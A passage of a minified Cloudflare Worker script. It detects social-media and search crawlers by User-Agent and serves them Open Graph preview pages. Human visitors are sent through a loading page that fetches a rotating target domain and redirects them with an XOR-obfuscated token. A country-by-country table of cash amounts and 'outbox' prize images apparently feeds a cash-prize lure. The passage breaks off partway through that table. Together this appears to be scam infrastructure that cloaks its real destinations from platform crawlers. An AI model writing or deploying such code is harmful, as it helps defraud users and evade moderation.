// Cloudflare Worker Bundle
var F={"Content-Type":"text/html; charset=utf-8","X-Content-Type-Options":"nosniff","X-Frame-Options":"DENY","X-XSS-Protection":"1; mode=block"},C={noCache:{"Cache-Control":"no-cache, no-store, must-revalidate"},publicCache:{"Cache-Control":"public, max-age=3600"}},w={reset:`
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f8f9fa;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #333;
    }
  `,errorCode:`
    .error-code { 
      font-size: 120px;
      font-weight: bold;
      color: #6c757d;
      line-height: 1;
    }
    @media (max-width: 480px) {
      .error-code { font-size: 80px; }
    }
  `,loading:`
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }
    .loading-spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loading-text {
      color: #666;
      font-size: 16px;
      text-align: center;
    }
    .loading-overlay.hidden {
      display: none;
    }
  `},B={basicPage:(o,e,t="",n="en")=>`
    <!DOCTYPE html>
    <html lang="${n}">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${o}</title>
      <link rel="icon" href="data:,">
      <style>
        ${w.reset}
        ${t}
      </style>
    </head>
    <body>
      ${e}
    </body>
    </html>
  `,errorPage:(o,e="en")=>B.basicPage(o.toString(),`<div class="error-code">${o}</div>`,w.errorCode,e)};function v(o,e=200,t={}){let n={...F,...t};return new Response(o,{status:e,headers:n})}function h(o,e="en"){let t=B.errorPage(o,e);return v(t,o,C.noCache)}function f(o,e={}){return v(o,200,{...C.publicCache,...e})}function V(o){if(!o||typeof o!="string")return"en";let e=o.substring(1).split("/");return e.length>=2?e[1].toLowerCase():"en"}async function W(o,e,t){try{let n=`${t}/index.php/api/Og/get?project_id=${o}&language=${e}`;console.log("\u{1F50D} \u8BF7\u6C42OG\u63A5\u53E3:",n);let a=await fetch(n,{method:"GET",headers:{Accept:"application/json"},signal:AbortSignal.timeout(15e3)});if(!a.ok){let r="";try{r=await a.text()}catch{}throw console.error("\u274C OG\u63A5\u53E3\u8BF7\u6C42\u5931\u8D25:",a.status,r),new Error(`HTTP error! status: ${a.status}, message: ${r}`)}let i=await a.json();return i.code===1&&i.data?(console.log("\u2705 OG\u4FE1\u606F\u83B7\u53D6\u6210\u529F:",i.data),i.data):(console.error("\u274C OG\u63A5\u53E3\u8FD4\u56DE\u683C\u5F0F\u9519\u8BEF:",i),null)}catch(n){return console.error("\u274C \u83B7\u53D6OG\u4FE1\u606F\u5F02\u5E38:",n.message),null}}function N(o){return!o||typeof o!="object"?!1:["title","description","image","url","siteName"].every(t=>o[t]&&typeof o[t]=="string")}function c(o={}){let{language:e="en"}=o;return h(404,e)}async function L(o,e){let{projectId:t,path:n=""}=o,i=V(n);console.log("\u{1F50D} \u751F\u6210OG\u9875\u9762\uFF0C\u9879\u76EEID:",t,"\u8BED\u8A00:",i);let r=e.OG_API_URL,s=await W(t,i,r);if(!N(s))return console.error("\u274C \u65E0\u6CD5\u83B7\u53D6\u6709\u6548OG\u4FE1\u606F\uFF0CprojectId:",t,"language:",i),new Response(`OG\u4FE1\u606F\u83B7\u53D6\u5931\u8D25 - projectId: ${t}, language: ${i}`,{status:500,headers:{"Content-Type":"text/plain; charset=utf-8"}});console.log("\u2705 OG\u4FE1\u606F\u9A8C\u8BC1\u901A\u8FC7\uFF0C\u5F00\u59CB\u751F\u6210\u9875\u9762");let p=`
    <!DOCTYPE html>
    <html lang="${i}">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${s.title}</title>
      <link rel="icon" href="data:,">
      
      <meta property="og:title" content="${s.title}">
      <meta property="og:description" content="${s.description}">
      <meta property="og:image" content="${s.image}">
      <meta property="og:url" content="${s.url}">
      <meta property="og:type" content="website">
      <meta property="og:site_name" content="${s.siteName}">
      <meta property="og:locale" content="${i==="zh"?"zh_CN":"en_US"}">
      
      <meta name="twitter:card" content="summary_large_image">
      <meta name="twitter:title" content="${s.title}">
      <meta name="twitter:description" content="${s.description}">
      <meta name="twitter:image" content="${s.image}">
      
      <meta name="description" content="${s.description}">
      <meta name="keywords" content="social, share, content">
      
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          background: #f8f9fa;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #333;
        }
        .og-container { 
          background: white;
          padding: 40px;
          border-radius: 16px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.1);
          max-width: 800px;
          width: 90%;
        }
        .og-title { 
          font-size: 28px;
          font-weight: bold;
          margin-bottom: 20px;
          color: #2c3e50;
        }
        .og-description { 
          font-size: 16px;
          color: #666;
          line-height: 1.6;
          margin-bottom: 30px;
        }
        .og-image { 
          max-width: 100%;
          height: auto;
          border-radius: 12px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        .og-meta {
          margin-top: 20px;
          padding-top: 20px;
          border-top: 1px solid #eee;
          font-size: 14px;
          color: #999;
        }
        @media (max-width: 480px) {
          .og-container { padding: 20px; }
          .og-title { font-size: 24px; }
        }
      </style>
    </head>
    <body>
      <div class="og-container">
        <h1 class="og-title">${s.title}</h1>
        <p class="og-description">${s.description}</p>
        <img src="${s.image}" alt="${s.title}" class="og-image">
        <div class="og-meta">
        </div>
      </div>
    </body>
    </html>
  `;return f(p)}function H(o,e){let{encryptedData:t,projectId:n,language:a="en",delay:i=100}=o,r=e.DOMAIN_API_URL,s=`
    <!DOCTYPE html>
    <html lang="${a}">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Loading...</title>
      <link rel="icon" href="data:,">
      <style>
        body { 
          font-family: system-ui, sans-serif;
          background: #f5f5f5;
          margin: 0;
          padding: 20px;
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
        }
        .container { 
          background: white;
          padding: 40px;
          border-radius: 8px;
          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          text-align: center;
        }
        .spinner { 
          border: 3px solid #f3f3f3;
          border-top: 3px solid #007bff;
          border-radius: 50%;
          width: 30px;
          height: 30px;
          animation: spin 1s linear infinite;
          margin: 0 auto 20px;
        }
        @keyframes spin { 
          0% { transform: rotate(0deg); } 
          100% { transform: rotate(360deg); } 
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="spinner"></div>
        <p>Loading...</p>
      </div>
      
      <script>
        const redirectData = {
          encryptedData: '${t}',
          projectId: '${n}'
        };
        
        const fallbackDomain = window.location.hostname;
        const domainApiUrl = '${r}/load?p=${n}';
        
        fetch(domainApiUrl)
          .then(response => response.json())
          .then(data => {
            let targetDomain;

            if (Array.isArray(data) && data.length > 0) {
              let domainUrl = data[0];
              if (!domainUrl.startsWith('http://') && !domainUrl.startsWith('https://')) {
                domainUrl = 'https://' + domainUrl;
              }
              
              const url = new URL(domainUrl);
              targetDomain = url.hostname;
            } else {
              targetDomain = fallbackDomain;
            }
            
            const redirectUrl = 'http://' + targetDomain + '/' + redirectData.encryptedData;
            
            setTimeout(function() {
              window.location.href = redirectUrl;
            }, ${i});
            
          })
          .catch(error => {
            const redirectUrl = 'http://' + fallbackDomain + '/' + redirectData.encryptedData;
            
            setTimeout(function() {
              window.location.href = redirectUrl;
            }, ${i});
          });
        
        setTimeout(function() {
          const fallbackUrl = 'http://' + fallbackDomain + '/' + redirectData.encryptedData;
          window.location.replace(fallbackUrl);
        }, 5000);
      </script>
    </body>
    </html>
  `;return f(s,{"Cache-Control":"no-cache, no-store, must-revalidate"})}function g(o=500,e={}){let{language:t="en"}=e;return h(o,t)}function Q(o){let e=o.headers.get("User-Agent")||"",t=o.headers.get("Accept-Language")||"";return J(e)?{type:"social_crawler",platform:X(e),isMobile:y(e)}:q(e)?{type:"search_crawler",engine:$(e),isMobile:!1}:Z(e)?{type:"crawler",isMobile:y(e)}:y(e)?{type:"mobile_user",isMobile:!0}:{type:"desktop_user",isMobile:!1}}function J(o){return[/facebookexternalhit/i,/twitterbot/i,/linkedinbot/i,/wechat/i,/micromessenger/i,/whatsapp/i,/telegrambot/i,/slackbot/i,/discordbot/i,/skypeuripreview/i,/viberbot/i,/linebot/i].some(t=>t.test(o))}function q(o){return[/googlebot/i,/bingbot/i,/baiduspider/i,/yandexbot/i,/duckduckbot/i,/sogou/i,/360spider/i,/shenmaspider/i].some(t=>t.test(o))}function Z(o){return[/bot/i,/crawler/i,/spider/i,/scraper/i,/curl/i,/wget/i,/python-requests/i,/java/i,/php/i,/go-http-client/i,/okhttp/i,/apache-httpclient/i].some(t=>t.test(o))}function y(o){return[/mobile/i,/android/i,/iphone/i,/ipad/i,/windows phone/i,/blackberry/i,/palm/i,/symbian/i,/opera mini/i,/opera mobi/i,/fennec/i,/minimo/i,/netfront/i,/up\.browser/i,/up\.link/i,/webos/i,/smartphone/i,/tablet/i].some(t=>t.test(o))}function X(o){return/facebookexternalhit/i.test(o)?"facebook":/twitterbot/i.test(o)?"twitter":/linkedinbot/i.test(o)?"linkedin":/wechat/i.test(o)||/micromessenger/i.test(o)?"wechat":/whatsapp/i.test(o)?"whatsapp":/telegrambot/i.test(o)?"telegram":/slackbot/i.test(o)?"slack":/discordbot/i.test(o)?"discord":/skypeuripreview/i.test(o)?"skype":/viberbot/i.test(o)?"viber":/linebot/i.test(o)?"line":"unknown"}function $(o){return/googlebot/i.test(o)?"google":/bingbot/i.test(o)?"bing":/baiduspider/i.test(o)?"baidu":/yandexbot/i.test(o)?"yandex":/duckduckbot/i.test(o)?"duckduckgo":/sogou/i.test(o)?"sogou":/360spider/i.test(o)?"360":/shenmaspider/i.test(o)?"shenma":"unknown"}function d(o){let t=(o.headers.get("Accept-Language")||"").split(",").map(n=>n.trim().split(";")[0]).filter(n=>n);if(t.length>0){let n=t[0].toLowerCase();if(n.startsWith("zh"))return"zh";if(n.startsWith("en"))return"en";if(n.startsWith("ja"))return"ja";if(n.startsWith("ko"))return"ko";if(n.startsWith("fr"))return"fr";if(n.startsWith("de"))return"de";if(n.startsWith("es"))return"es";if(n.startsWith("ru"))return"ru"}return"en"}function G(o){let e=o.headers.get("CF-IPCountry");if(e&&e!=="XX")return e.toUpperCase();let t=o.headers.get("Accept-Language")||"",n=tt(t);if(n)return n;let a=o.headers.get("User-Agent")||"",i=ot(a);return i||"MY"}function tt(o){let e=o.split(",").map(t=>t.trim().split(";")[0]).filter(t=>t);if(e.length>0){let t=e[0].toLowerCase(),n={"zh-cn":"CN","zh-tw":"TW","zh-hk":"HK",zh:"CN",ja:"JP",ko:"KR",th:"TH",vi:"VN",id:"ID",ms:"MY","en-us":"US","en-gb":"GB","en-au":"AU","en-ca":"CA",en:"US",fr:"FR",de:"DE",es:"ES",ru:"RU",ar:"SA",hi:"IN",pt:"BR"};if(n[t])return n[t];for(let[a,i]of Object.entries(n))if(t.startsWith(a))return i}return null}function ot(o){let e=o.toLowerCase(),t={"zh-cn":"CN","zh-tw":"TW","zh-hk":"HK","ja-jp":"JP","ko-kr":"KR","th-th":"TH","vi-vn":"VN","id-id":"ID","ms-my":"MY","en-us":"US","en-gb":"GB","en-au":"AU","en-ca":"CA","fr-fr":"FR","de-de":"DE","es-es":"ES","ru-ru":"RU","ar-sa":"SA","hi-in":"IN","pt-br":"BR"};for(let[n,a]of Object.entries(t))if(e.includes(n))return a;return null}async function Y(o,e){if(!e||typeof e!="string"||e.length<16)throw new Error("ERROR: secretKey is required and must be a string with at least 16 characters");try{let t=e.slice(0,16),n="";for(let i=0;i<o.length;i++){let r=o.charCodeAt(i)^t.charCodeAt(i%t.length);n+=String.fromCharCode(r)}return btoa(n).replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"")}catch(t){throw new Error("\u52A0\u5BC6\u5931\u8D25: "+t.message)}}async function _(o,e){try{let t=o.replace(/-/g,"+").replace(/_/g,"/"),n=t+"=".repeat((4-t.length%4)%4),a=atob(n),i=e.slice(0,16),r="";for(let s=0;s<a.length;s++){let p=a.charCodeAt(s)^i.charCodeAt(s%i.length);r+=String.fromCharCode(p)}return r}catch(t){return console.error("\u6838\u5FC3\u89E3\u5BC6\u5931\u8D25:",t),null}}async function K(o,e){try{return await Y(o,e)}catch(t){throw console.error("\u9879\u76EEID\u52A0\u5BC6\u5931\u8D25:",t),new Error("\u9879\u76EEID\u52A0\u5BC6\u5931\u8D25")}}async function et(o,e){try{return await _(o,e)}catch(t){return console.error("\u9879\u76EEID\u89E3\u5BC6\u5931\u8D25:",t),null}}async function k(o,e){try{let t=o.timestamp.toString(36),n=o.validity.toString(36),a=`${o.projectId}~${t}~${n}`;return await Y(a,e)}catch(t){throw console.error("\u8DF3\u8F6C\u6570\u636E\u52A0\u5BC6\u5931\u8D25:",t),new Error("\u8DF3\u8F6C\u6570\u636E\u52A0\u5BC6\u5931\u8D25")}}async function nt(o,e){try{let t=await _(o,e);if(!t)return{valid:!1,error:"\u89E3\u5BC6\u5931\u8D25"};let[n,a,i]=t.split("~");return{projectId:n,timestamp:parseInt(a,36),validity:parseInt(i,36),valid:!0}}catch(t){return console.error("\u8DF3\u8F6C\u6570\u636E\u89E3\u5BC6\u5931\u8D25:",t),{valid:!1,error:"\u89E3\u5BC6\u5931\u8D25"}}}function E(o,e){let t=Math.floor(Date.now()/1e3),n=o+e;return t<=n}function T(){return Math.floor(Date.now()/1e3)}async function b(o,e){try{let t=await nt(o,e);if(t.valid&&at(t))return{type:"landing",data:t}}catch{}try{let t=await et(o,e);if(t&&it(t))return{type:"jump",data:{projectId:t}}}catch{}return{type:"invalid",data:null}}function at(o){return o.projectId&&o.timestamp&&o.validity&&o.timestamp>1e9&&o.timestamp<9999999999&&o.validity>0&&o.validity<31536e3}function it(o){return o&&typeof o=="string"&&o.length>0&&/^[A-Z]{2}-\d{4}$/.test(o)}function x(o,e){let t=e.PROJECT_ID_PATTERN||"^[A-Z]{2}-\\d{4}$";return new RegExp(t).test(o)?{valid:!0,projectId:o}:{valid:!1,error:"\u9879\u76EEID\u683C\u5F0F\u4E0D\u6B63\u786E"}}async function R(o,e,t,n){try{let a=`${o}-${e}-${t}`;return await Y(a,n)}catch(a){throw console.error("\u9879\u76EEID\u4E0E\u8BED\u8A00\u3001\u56FD\u5BB6\u62FC\u63A5\u52A0\u5BC6\u5931\u8D25:",a),new Error("\u9879\u76EEID\u4E0E\u8BED\u8A00\u3001\u56FD\u5BB6\u62FC\u63A5\u52A0\u5BC6\u5931\u8D25")}}var O={SG:{amount:"4,000 Dollar",image:"https://1.bp.blogspot.com/-6SBR2s4zQlM/YKtbRx2NOiI/AAAAAAAABoY/H3WF-TtYto83KYytqitTAqRc7pQOEbGvgCLcBGAsYHQ/s16000/Singapore_outbox.png"},MY:{amount:"2,000 Ringgit",image:"https://1.bp.blogspot.com/-UGoWNqD79aU/YKsjal4qS6I/AAAAAAAABhc/zBRJhOxtqQMhZ_vwP66IEHuTCHmeb0HnACLcBGAsYHQ/s16000/Malaysia_outbox.png"},TH:{amount:"10,000 \u0E1A\u0E32\u0E17",image:"https://1.bp.blogspot.com/-JBdWiqgfQSQ/YKu9A9SJY_I/AAAAAAAABsA/bpyd__hCrnwy966oCK5JwqgRCf-EgsfOgCLcBGAsYHQ/s16000/Thailand_outbox.png"},ID:{amount:"2.000.000 Rupiah",image:"https://1.bp.blogspot.com/-JYnIuoGId9A/YKsjZhU0kAI/AAAAAAAABhE/wkSjnKN9XV8Dek9gm1CY0LoiVawxJFSKwCLcBGAsYHQ/s16000/Indonesia_outbox.png"},PH:{amount:"7,000 pesos",image:"https://1.bp.blogspot.com/-W2WYSQ_WT_s/YKu9AJJerVI/AAAAAAAABrw/p3u5Uvp8zZQUMBJN7eZY7Ov61P7uQA-4ACLcBGAsYHQ/s16000/Philippines_outbox.png"},VN:{amount:"2.000.000 \u0110\u1ED3ng",image:"https://1.bp.blogspot.com/-v67aLwh8dYk/YKu9CLBrwrI/AAAAAAAABsY/adi8yMBr4rYzMFp5jnGiEYw6gH5PvjuNACLcBGAsYHQ/s16000/Vietnam_outbox.png"},IN:{amount:"6,000 rupees",image:"https://1.bp.blogspot.com/-chvMFusPnLM/YKpjhtXpciI/AAAAAAAABdk/nipNXLuIYSkKS0VB_oe11ktAmlWy24ttgCLcBGAsYHQ/s16000/India_outbox.png"},BR:{amount:"1.000 REAL",image:"https://1.bp.blogspot.com/-yL43MBphNiY/YKpjeqFPZgI/AAAAAAAABcU/I15IrSTgzk48ZVAPgJuzBWE3xhU_Qpr2ACLcBGAsYHQ/s16000/Brazil_outbox.png"},PK:{amount:"50,000 Rupees",image:"https://1.bp.blogspot.com/-uHzb-ulJT4s/YKpjjV1xa1I/AAAAAAAABeQ/Mxsw-l_OTvAlyQmxIq08b2cSW3vnW8KugCLcBGAsYHQ/s16000/Pakistan_outbox.png"},NG:{amount:"100,000 Naira",image:"https://1.bp.blogspot.com/-j_Tt7dZ6ovg/YKtbPa36Y2I/AAAAAAAABno/cmY_bmjIf9YDIo4HgS5jMesLSkdbggAFgCLcBGAsYHQ/s16000/Nigeria_outbox.png"},BD:{amount:"5,000 taka",image:"https://1.bp.blogspot.com/--tqT3kRP830/YKtbFdUwngI/AAAAAAAABkA/ua0BrYc9UHEhFF6yNKMMC78feZ7fPmrkwCLcBGAsYHQ/s16000/Bangladesh_outbox.png"},RU:{amount:"40 000 \u0440\u0443\u0431",image:"https://1.bp.blogspot.com/-xZIYl_pq-YI/YKpjkqHzFHI/AAAAAAAABe0/xTqgPZXNh0IZr18l63idem9UnkMosjzYgCLcBGAsYHQ/s16000/Russia_outbox.png"},MX:{amount:"9,000 Peso",image:"https://1.bp.blogspot.com/-nHfaAvYUXxA/YKpjiCmiYAI/AAAAAAAABd0/o7ubZ89vAVsvqUzp--FVLMgBu6QqhSZoQCLcBGAsYHQ/s16000/Mexico_outbox.png"},JP:{amount:"30,000 \u5186",image:"https://1.bp.blogspot.com/-xcYRFYXShY0/YY-AuzlEGRI/AAAAAAAAI8s/Z0GLlN2oNHYAPWgxQHhS2qCWDUcXNMBswCLcBGAsYHQ/s16000/wai.png"},ET:{amount:"10,000 Birr",image:"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihmKsdVpS6nOwXY4BjsfGPfPrrRugflp5LDFzO-p6CTkfbqqwJoaLqCSl5w9bozNfrKgNzTYdRU36GjQrN80IOTlxXylhP6yXni4aI1c2PG3pCQkF-umZ800WCh7ICxTUZu0delKSKnKhDKtSkhXJMTRIEIk7QGxYbT_Ucp5u2Sx94DiQepvg6i_un-KKV/s640/Ethiopia_outbox.png"},EG:{amount:"3,000 \u062C\u0646\u064A\u0647",image:"https://1.bp.blogspot.com/-wRXVUHEl7Cg/YKsjZSRS4oI/AAAAAAAABg8/ArXgGmvvdHAtsbRwaNnpyN16JblOReKXwCLcBGAsYHQ/s16000/Egypt_outbox.png"},CD:{amount:"600 000 francs",image:"https://1.bp.blogspot.com/-TKjnEo2J_4Y/YW5B88R78yI/AAAAAAAAAE8/9G63tUQRvsgqUyOm8OfngJijMYjFhuEjgCLcBGAsYHQ/s16000/wai.png"},DE:{amount:"2.000 Euro",image:"https://1.bp.blogspot.com/-mhFwYo28B2Q/YKppmIsu7ZI/AAAAAAAABgQ/c7DWa0Yxwm49LJDcNEkzDr503wyn4hLtACLcBGAsYHQ/s16000/Germany_outbox.png"},IR:{amount:"1,000,000 \u062A\u0648\u0645\u0627\u0646",image:"https://1.bp.blogspot.com/-s7w4Ev0aIWI/YKtbKmtJo-I/AAAAAAAABlw/Az_rtDTg0v0DzCf-eGgh5dgbjVwd5GV-gCLcBGAsYHQ/s16000/Iran_outbox.png"},TR:{amount:"20.000 Lira",image:"https://1.bp.blogspot.com/-5ma4FkidviQ/YKpjlTvXJwI/AAAAAAAABfM/XrXSD4BBJEA3kR9G4yJZJ4DK-uu-nV0EQCLcBGAsYHQ/s16000/Turkey_outbox.png"},FR:{amount:"1 000 euros",image:"https://1.bp.blogspot.com/-KS3721689ps/YKpjgtgRlHI/AAAAAAAABdE/vNlsXI_jO9ox1ECoErGjmnvoTlVIwknOgCLcBGAsYHQ/s16000/France_outbox.png"},GB:{amount:"1,000 pound",image:"https://1.bp.blogspot.com/-6T9Mql6Lb0Y/YKpjl3C-f9I/AAAAAAAABfc/71GwUuvyEXQOlwkJB9oSf2jH6EK1MbmQACLcBGAsYHQ/s16000/United-Kingdom_outbox.png"},IT:{amount:"1.000 Euro",image:"https://1.bp.blogspot.com/-qbhqzDbNOso/YKpjiMUMb8I/AAAAAAAABdw/qx4SegCpUeISQH01X-vJmrhpmcAPGgTMwCLcBGAsYHQ/s16000/Italy_outbox.png"},ZA:{amount:"4,000 Rand",image:"https://1.bp.blogspot.com/-sqhEwPUTbUI/YKtbSLQk-CI/AAAAAAAABoc/aG2GjHq02t4gWT-RmRCYQcU0hT2c7tkZACLcBGAsYHQ/s16000/South-Africa_outbox.png"},TZ:{amount:"500,000 Shilling",image:"https://1.bp.blogspot.com/-pRbCAZHvWb8/YKtbT_Z5W2I/AAAAAAAABpM/OrACIdfeRgcOWJ72hXQdfv0vDo_pPml2gCLcBGAsYHQ/s16000/Tanzania_outbox.png"},MM:{amount:"500,000 \u1000\u103B\u1015\u103A",image:"https://1.bp.blogspot.com/-F8mLYo7bdv0/YKu8_mHpwhI/AAAAAAAABro/yDRG9CiU-Q41sIgbYVyGIx0JsxvKbpFLgCLcBGAsYHQ/s16000/Myanmar_outbox.png"},KR:{amount:"1,000,000 \uC6D0",image:"https://1.bp.blogspot.com/-mIN-J8U1Npw/YKu8-3LmV4I/AAAAAAAABrY/fIugGQO4rGIWVKIFxC-K-ui7BjlJ7a7JQCLcBGAsYHQ/s16000/Korea_outbox.png"},KE:{amount:"9,000 Shilling",image:"https://1.bp.blogspot.com/-SDhjE12u1do/YKtbMHxW__I/AAAAAAAABmY/-yCgYDe0Cdgq3J7gmkAfgosXJmcIEk2IACLcBGAsYHQ/s16000/Kenya_outbox.png"},ES:{amount:"1.000 euros",image:"https://1.bp.blogspot.com/-skfsK7La8d4/YKpjlDm6VcI/AAAAAAAABfE/JsR3qbX6Z-458cw8ObOHueDJn_Unzy_wwCLcBGAsYHQ/s16000/Spain_outbox.png"},CO:{amount:"1.000.000 Peso",image:"https://1.bp.blogspot.com/-X9iO0QzPhOc/YKpje5RsE2I/AAAAAAAABcc/8Pcz9dVqwEAwXXF8IV3E-MQq8S13AfMIgCLcBGAsYHQ/s16000/Colombia_outbox.png"},AR:{amount:"500.000 Peso",image:"https://1.bp.blogspot.com/-KYJblTtZtwA/YKpjd_w-gBI/AAAAAAAABcI/f65QgRwrE-wKmzi23Itd4fd6ngboOlMdACLcBGAsYHQ/s16000/Argentina_outbox.png"},DZ:{amount:"20,000 \u062F\u064A\u0646\u0627\u0631",image:"https://1.bp.blogspot.com/-FwfP59f0Hq0/YKsjX3RB_mI/AAAAAAAABgg/sMzIfMnBEbgZpJsgyHMvlKfiCyATBc7cwCLcBGAsYHQ/s16000/Algeria_outbox.png"},UA:{amount:"5 000 \u0433\u0440\u0438\u0432\u0435\u043D",image:"https://1.bp.blogspot.com/-EYwtzJlg28c/YKsjeOO-_7I/AAAAAAAABi0/5q4n17TBaH09YUF7uMJEUyI0GsnN2dnSQCLcBGAsYHQ/s16000/Ukraine_outbox.png"},SD:{amount:"80,000 Pound",image:"https://1.bp.blogspot.com/-TbEsTUlmJCg/YKu9ArTfAFI/AAAAAAAABr4/OVNW1isqvNIIuCffsp9HLUTZCICLRl_WACLcBGAsYHQ/s16000/Sudan_outbox.png"},UG:{amount:"1,000,000 Shilling",image:"https://1.bp.blogspot.com/-qA4A97HG6aw/YKu9BfwJgZI/AAAAAAAABsI/RbMza3pmBZk05ZVIWhwJpCTLXMf19CDLACLcBGAsYHQ/s16000/Uganda_outbox.png"},IQ:{amount:"300,000 \u062F\u064A\u0646\u0627\u0631",image:"https://1.bp.blogspot.com/-xmI9RFpH1hk/YKtbKsdPVJI/AAAAAAAABl0/P_wKWKOkZl0eKAievNP9NWgABkF8GNmrQCLcBGAsYHQ/s16000/Iraq_outbox.png"},PL:{amount:"2 000 z\u0142",image:"https://1.bp.blogspot.com/-AWKlaujcfyg/YKpjj777LhI/AAAAAAAABek/Si1GDJ58KTEA9p0DEcjJMSlF33kKP-q9ACLcBGAsYHQ/s16000/Poland_outbox.png"},CA:{amount:"3,000 dollars",image:"https://1.bp.blogspot.com/-Zvz8MUJhQd8/YKsjY50KasI/AAAAAAAABgs/o_EK8ZiVbMQao5jkfesk20OrHxWDf8PGgCLcBGAsYHQ/s16000/Canada_outbox.png"},MA:{amount:"1,000 \u0627\u0644\u062F\u0631\u0647\u0645",image:"https://1.bp.blogspot.com/-hFjfTL4vBlQ/YKpjiZ5rtoI/AAAAAAAABd8/Dq6sbXzMhBgicJqOnYfKKMLYkOyPB9ZAQCLcBGAsYHQ/s16000/Morocco_outbox.png"},SA:{amount:"4,000 \u0631\u064A\u0627\u0644",image:"https://1.bp.blogspot.com/-RlqCun0luS8/YKpjk92nPXI/AAAAAAAABe8/fRWWnMH4gFMlnvg366OMjb0zAGvux_clQCLcBGAsYHQ/s16000/Saudi-Arabia_outbox.png"},UZ:{amount:"2 000 000 som",image:"https://1.bp.blogspot.com/-WMbHlN6Fzxw/YKu9BqMaQiI/AAAAAAAABsQ/DSwtJLl_hjA7Ur5ttHBsrx98JotgkZUvwCLcBGAsYHQ/s16000/Uzbekistan_outbox.png"},PE:{amount:"1.000 sol",image:"https://1.bp.blogspot.com/-s6zpYIZEIGQ/YKpjjgbxj9I/AAAAAAAABec/dK8SRvMbdK0otL0KuCgsFHSWAiCMZu52wCLcBGAsYHQ/s16000/Peru_outbox.png"},VE:{amount:"30.000 bol\xEDvares",image:"https://1.bp.blogspot.com/-Yophy5Wp-xA/YKpjmQWkDTI/AAAAAAAABfs/NmoIhZ6ug7M2BhBDoGT4_3fqshxEwNumACLcBGAsYHQ/s16000/Venezuela_outbox.png"},AF:{amount:"10,000 \u0627\u0641\u063A\u0627\u0646\u06CC",image:"https://1.bp.blogspot.com/-9ieCUOhXBp0/YKtbD64zRUI/AAAAAAAABjc/A-UiC9KNo9Y3LzUJC-OJD5hob1IHyUgngCLcBGAsYHQ/s16000/Afghanistan_outbox.png"},GH:{amount:"500 Cedi",image:"https://1.bp.blogspot.com/-wAcjnpIvgSQ/YKu8-Rq28dI/AAAAAAAABrQ/is5ZieThWmcrqdAkT_RMs-aCnDObMtsjwCLcBGAsYHQ/s16000/Ghana_outbox.png"},AO:{amount:"80.000 Kwanza",image:"https://1.bp.blogspot.com/-_kUb9adhZiI/YKu89poMNXI/AAAAAAAABq8/HrXqK6QBS3E3biESWodOf0v0tLtSyNjnQCLcBGAsYHQ/s16000/Angola_outbox.png"},NP:{amount:"5,000 Rupee",image:"https://1.bp.blogspot.com/-3buOEA9BSGw/YKpji7u05YI/AAAAAAAABeE/mzIbMGSzPXQMdovS1URHPVnUzbtWwTqIgCLcBGAsYHQ/s16000/Nepal_outbox.png"},YE:{amount:"50,000 \u0631\u064A\u0627\u0644",image:"https://1.bp.blogspot.com/-R6KvAzo1tvU/YKu9CiHA1aI/AAAAAAAABsg/Fg9wnDHVOaIA5874p8KAjzEgzmaJEhkFQCLcBGAsYHQ/s16000/Yemen_outbox.png"},MZ:{amount:"10.000 meticais",image:"https://1.bp.blogspot.com/-VuqsnPrAhQY/YKu8_R8gXoI/AAAAAAAABrg/urBn5z721RoZ4e97F3fGz_0g5-gkv4JWACLcBGAsYHQ/s16000/Mozambique_outbox.png"},CI:{amount:"40 000 franc",image:"https://1.bp.blogspot.com/-cLeO9AGFmYY/YKtbHqWHc0I/AAAAAAAABkw/lRIwddnvyvkNaAbB-x-F1v60V_cjcmWBwCLcBGAsYHQ/s16000/Cote-d%2527Ivoire_outbox.png"},AU:{amount:"3,000 Dollar",image:"https://1.bp.blogspot.com/-tysbDrva6do/YKtbEX_G_sI/AAAAAAAABjo/w-fovWuI4W4zULeiy3JZOmXyXfvHOqS6gCLcBGAsYHQ/s16000/Australia_outbox.png"},MG:{amount:"70 000 francs",image:"https://1.bp.blogspot.com/-Zg_5o_KYw2U/YZSXGVJX0dI/AAAAAAAAJDc/n4cYN5CiMWYpmErGLDTYmUxELeiWQaZtwCLcBGAsYHQ/s16000/wai.png"},CM:{amount:"100 000 franc",image:"https://1.bp.blogspot.com/-tqaTAXcYLmc/YKtbHRlkIpI/AAAAAAAABko/0xcSQz251y41M8q1IPo-plso-3IfErtBACLcBGAsYHQ/s16000/Cameroon_outbox.png"},LK:{amount:"30,000 \u0BB0\u0BC2\u0BAA\u0BBE\u0BAF\u0BCD",image:"https://1.bp.blogspot.com/-itB66KJ6kVc/YKtbSdtFU9I/AAAAAAAABoo/MUInHXUdHYc1NdRCSYd_DlKOP-EdVmNcACLcBGAsYHQ/s16000/Sri-Lanka_outbox.png"},BF:{amount:"20 000 